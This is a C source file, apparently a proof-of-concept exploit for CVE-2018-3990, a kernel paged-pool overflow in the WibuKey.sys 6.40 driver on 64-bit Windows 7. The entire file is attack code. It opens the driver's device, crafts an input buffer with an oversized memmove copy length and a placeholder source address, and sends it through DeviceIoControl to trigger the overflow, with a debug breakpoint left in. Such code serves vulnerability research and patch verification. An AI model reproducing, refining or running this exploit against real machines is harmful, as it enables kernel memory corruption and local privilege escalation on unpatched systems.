#include "exploit.h"

// The output buffer length is stored in rbp
// The size compared against the output buffer length is stored in the lowest 16-bits in rax.
int main(int argc, char** argv)
{
	MEMMOVE_INPUT_BUFFER input;
	HANDLE h_driver = CreateFileA(WIBUKEY_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long bytes_returned = 0, output[0xC];
	unsigned char unused = 0;

	RtlSecureZeroMemory(&output, sizeof(output));
	RtlSecureZeroMemory(&input, sizeof(input));

	SetConsoleTitleA("CVE-2018-3990 / TALOS-2018-0658");

	printf("[*] WIBU-SYSTEMS WibuKey.sys Version 6.40 Build 2400 Kernel Paged-Pool Overflow Local Code Execution\n[*] Tested successfully on Windows 7 Build 7601 SP1 Version 6.1 64-bit\n[*] Written by ExAllocatePool2\n[!] Let's exploit!");

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the device driver. Handle Value: 0x%p", h_driver);

	input.Source = 0x4141414141414141;
	input.MemmoveCopySize = 0xFFFFFFF5;				// Stored in edi
	input.ComparedMemmoveCopySize = 0xFFFFFFFF;		// Stored in esi
	input.OutputBufferLength = sizeof(output);		// Stored in rbp
	input.JumpTableCode = 16 + 16;
	
	printf("\n[+] Crafted the input buffer.");

	DebugBreak();
	DeviceIoControl(h_driver, TARGET_IOCTL, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);

	printf("\n[+] Exploit completed.");
	unused = getchar();
	return 0;
}

// NOTE:
// Both the input buffer and output buffer lengths must be greater than or equal to 0xC!